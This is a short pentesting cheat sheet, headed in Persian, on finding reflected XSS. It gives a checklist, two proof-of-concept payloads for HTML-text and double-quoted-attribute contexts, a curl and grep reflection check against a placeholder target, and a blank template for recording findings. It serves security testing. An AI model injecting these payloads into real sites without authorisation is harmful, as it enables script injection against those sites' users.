---
tags: [web, xss, reflected]
---

# Reflected XSS

## چک‌لیست

- [ ] ورودی در همان پاسخ درخواست بازتاب می‌شود.
- [ ] بازتاب در View Source بررسی شده، نه فقط DevTools.
- [ ] Context و Encoding مشخص است.
- [ ] لینک یا درخواست اثبات قابل تکرار است.

## HTML Text Context

```html
<svg onload=alert(1)>
```

## Double-Quoted Attribute

```html
" autofocus onfocus=alert(1) x="
```

## بررسی با curl

```bash
curl -sS 'https://target.example/search?q=rasad-xss-7f3a' | \
  grep -n -C 2 'rasad-xss-7f3a'
```

## ثبت Context

```text
Parameter:
Reflection count:
HTML location:
Encoded characters:
Working payload:
Impact:
```
